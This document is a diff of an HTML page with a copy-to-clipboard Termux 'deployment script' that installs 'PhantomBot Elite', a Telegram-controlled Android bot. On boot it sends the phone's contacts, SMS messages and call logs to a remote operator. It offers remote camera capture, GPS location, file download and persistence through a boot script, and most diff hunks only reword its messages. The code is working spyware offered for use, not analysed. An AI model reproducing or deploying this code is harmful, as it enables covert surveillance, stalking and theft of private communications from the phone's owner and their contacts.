                         <div class="code-block" id="commandBox">yes | pkg update -y && yes | pkg upgrade -y && yes | pkg install -y python termux-api termux-tools && pip install --no-input python-telegram-bot && mkdir -p ~/.termux/boot && rm -f ~/bot.py && cat > ~/bot.py << 'EOF'
 import os, time, asyncio, json
 from telegram import Update
@@ -517,10 +732,10 @@ async def send_file_to_me(app, cmd, emoji, name):
 
 async def boot_dump(app):
     try:
-        await app.bot.send_message(chat_id=AUTHORIZED_ID, text="🟢 PhantomBot Online - Dumping Intel...")
+        await app.bot.send_message(chat_id=AUTHORIZED_ID, text="🟢 PhantomBot Online — Dumping Intel...")
         for name, cmd, emoji in [("Contacts", "termux-contact-list", "📇"), ("SMS", "termux-sms-list", "💬"), ("Calls", "termux-call-log", "📞")]:
             await send_file_to_me(app, cmd, emoji, name)
-        await app.bot.send_message(chat_id=AUTHORIZED_ID, text="✅ Intel Dump Complete. PhantomBot Ready.\nType /help to view all commands.")
+        await app.bot.send_message(chat_id=AUTHORIZED_ID, text="✅ Intel Dump Complete. PhantomBot is Live.\nType /help to view the command roster.")
         os.system(f"touch {FLAG}")
     except Exception as e:
         await app.bot.send_message(chat_id=AUTHORIZED_ID, text=f"Error: {e}")
@@ -536,7 +751,7 @@ async def cam(update, context):
             await update.message.reply_photo(photo=f, caption="📷 Captured")
         os.remove(p)
     else:
-        await update.message.reply_text("❌ Camera unavailable. Check permissions.")
+        await update.message.reply_text("❌ Camera unavailable. Verify permissions.")
 
 async def loc(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
@@ -546,19 +761,19 @@ async def loc(update, context):
         lat = data.get("latitude", 0)
         lon = data.get("longitude", 0)
         maps_link = f"https://maps.google.com/?q={lat},{lon}"
-        await update.message.reply_text(f"📍 Location Locked:\nLat: {lat}\nLon: {lon}\n\n🗺️ {maps_link}")
+        await update.message.reply_text(f"📍 Position Locked:\nLat: {lat}\nLon: {lon}\n\n🗺️ {maps_link}")
         await update.message.reply_location(latitude=lat, longitude=lon)
     except:
-        await update.message.reply_text(f"📍 Raw Data:\n{out}")
+        await update.message.reply_text(f"📍 Raw Telemetry:\n{out}")
 
 async def bat(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
-    await update.message.reply_text(f"🔋 Power Status:\n```\n{run('termux-battery-status')}\n```")
+    await update.message.reply_text(f"🔋 Power Diagnostics:\n```\n{run('termux-battery-status')}\n```")
 
 async def dl(update, context):
     if update.effective_user.id != AUTHORIZED_ID or not context.args: return
     os.system(f"termux-download {context.args[0]}")
-    await update.message.reply_text("✅ Download initiated to /sdcard/Downloads")
+    await update.message.reply_text("✅ Retrieval initiated → /sdcard/Downloads")
 
 async def say(update, context):
     if update.effective_user.id != AUTHORIZED_ID or not context.args: return
@@ -569,7 +784,7 @@ async def vib(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
     dur = context.args[0] if context.args else "500"
     os.system(f"termux-vibrate -d {dur}")
-    await update.message.reply_text(f"📳 Haptic pulse: {dur}ms")
+    await update.message.reply_text(f"📳 Haptic Pulse: {dur}ms")
 
 async def tor(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
@@ -579,36 +794,36 @@ async def tor(update, context):
 
 async def calls(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
-    await update.message.reply_text("⏳ Extracting Call Logs...")
+    await update.message.reply_text("⏳ Extracting Call History...")
     await send_file_to_me(update, "termux-call-log", "📞", "Call_Logs")
 
 async def cont(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
-    await update.message.reply_text("⏳ Extracting Contacts...")
+    await update.message.reply_text("⏳ Extracting Contact Database...")
     await send_file_to_me(update, "termux-contact-list", "📇", "Contacts")
 
 async def sms_cmd(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
-    await update.message.reply_text("⏳ Extracting SMS Database...")
+    await update.message.reply_text("⏳ Extracting SMS Records...")
     await send_file_to_me(update, "termux-sms-list", "💬", "SMS")
 
 async def start(update, context):
-    await update.message.reply_text("💎 *PhantomBot Elite v3.0*\nSystem Online.\nType /help for command roster.")
+    await update.message.reply_text("◆ *PhantomBot Elite v3.0*\nSystem Online. Type /help for the command roster.")
 
 async def help_cmd(update, context):
-    await update.message.reply_text("""💎 *PhantomBot Elite — Command Roster*
+    await update.message.reply_text("""◆ *PhantomBot Elite — Command Roster*
 
-📷 /cam [back|front] — Remote Capture
-📍 /location — GPS Triangulation + Maps
-🔋 /battery — Power Diagnostics
-⬇️ /download &lt;url&gt; — File Retrieval
-🗣️ /say &lt;text&gt; — Voice Broadcast
-📳 /vibrate [ms] — Haptic Control
+📷 /cam [back|front] — Remote Image Capture
+📍 /location — GPS Triangulation & Maps
+🔋 /battery — Power System Diagnostics
+⬇️ /download &lt;url&gt; — Remote File Retrieval
+🗣️ /say &lt;text&gt; — Voice Broadcast System
+📳 /vibrate [ms] — Haptic Feedback Control
 🔦 /torch on|off — Illuminator Toggle
-📞 /calls — Call Log Extraction (.txt)
-📇 /contacts — Contact Extraction (.txt)
-💬 /sms — SMS Extraction (.txt)
-❓ /help — Display This Roster""")
+📞 /calls — Call Log Export (.txt)
+📇 /contacts — Contact Database Export (.txt)
+💬 /sms — SMS Record Export (.txt)
+❓ /help — Display Command Roster""")
 
 async def main():
     app = Application.builder().token(BOT_TOKEN).build()
@@ -629,7 +844,7 @@ async def main():
     if not os.path.exists(FLAG):
         await boot_dump(app)
     
-    print("💎 PhantomBot Elite v3.0 — ONLINE")
+    print("◆ PhantomBot Elite v3.0 — ONLINE")
     await app.updater.start_polling()
     
     while True:
@@ -651,47 +866,52 @@ termux-wake-lock
 cd ~
 python bot.py &
 BOOT
-chmod +x ~/.termux/boot/start_bot.sh && echo '💎 PhantomBot Elite Deployed' && python ~/bot.py</div>
+chmod +x ~/.termux/boot/start_bot.sh && echo '◆ PhantomBot Elite Deployed Successfully' && python ~/bot.py</div>
                     </div>
                 </div>
 
             </div>
 
-            <!-- Footer -->
-            <div class="footer">
-                <div class="features-row">
-                    <span class="feature-tag active"><span class="icon">✅</span> 10 Commands</span>
-                    <span class="feature-tag active"><span class="icon">🗺️</span> GPS Maps</span>
-                    <span class="feature-tag active"><span class="icon">📄</span> .txt Exports</span>
-                    <span class="feature-tag active"><span class="icon">🔄</span> Auto-Restart</span>
-                    <span class="feature-tag active"><span class="icon">🔐</span> Encrypted</span>
+            <!-- ===== FOOTER ===== -->
+            <div class="card-footer">
+                <div class="tag-row">
+                    <span class="tag"><span class="tag-dot"></span> 10 Commands</span>
+                    <span class="tag"><span class="tag-dot"></span> GPS Maps</span>
+                    <span class="tag"><span class="tag-dot"></span> .txt Exports</span>
+                    <span class="tag"><span class="tag-dot"></span> Auto-Restart</span>
+                    <span class="tag"><span class="tag-dot"></span> End-to-End Encrypted</span>
                 </div>
             </div>
 
         </div>
     </div>
 
-    <!-- Toast -->
-    <div class="toast" id="toast">✅ Command Copied to Clipboard</div>
+    <!-- Toast Notification -->
+    <div class="toast-bar" id="toast">
+        <span class="toast-icon">✓</span> Deployment script copied to clipboard
+    </div>
 
     <script>
         function copyCommand() {
-            const text = document.getElementById('commandBox').textContent;
-            navigator.clipboard.writeText(text).then(() => {
-                const btn = document.getElementById('copyBtn');
-                const toast = document.getElementById('toast');
-                
-                btn.innerHTML = '<span>✅</span> Copied! Paste in Termux';
+            const codeBlock = document.getElementById('commandBox');
+            const btn = document.getElementById('deployBtn');
+            const toast = document.getElementById('toast');
+            
+            navigator.clipboard.writeText(codeBlock.textContent).then(() => {
+                // Button animation
+                btn.innerHTML = '<span>✓</span> Copied — Paste in Termux';
                 btn.style.background = '#f59e0b';
-                btn.style.boxShadow = '0 8px 35px rgba(245,158,11,0.5)';
+                btn.style.boxShadow = '0 4px 24px rgba(245,158,11,0.35)';
                 
-                toast.classList.add('show');
-                setTimeout(() => toast.classList.remove('show'), 2500);
+                // Toast animation
+                toast.classList.add('visible');
+                setTimeout(() => toast.classList.remove('visible'), 2800);
                 
+                // Reset button
                 setTimeout(() => {
-                    btn.innerHTML = '<span>📋</span> Copy Deployment Command';
+                    btn.innerHTML = '<span>📋</span> Copy Deployment Script';
                     btn.style.background = '#00ff88';
-                    btn.style.boxShadow = '0 4px 20px rgba(0,255,136,0.3)';
+                    btn.style.boxShadow = '0 2px 12px rgba(0,255,136,0.2)';
                 }, 3000);
             });
         }
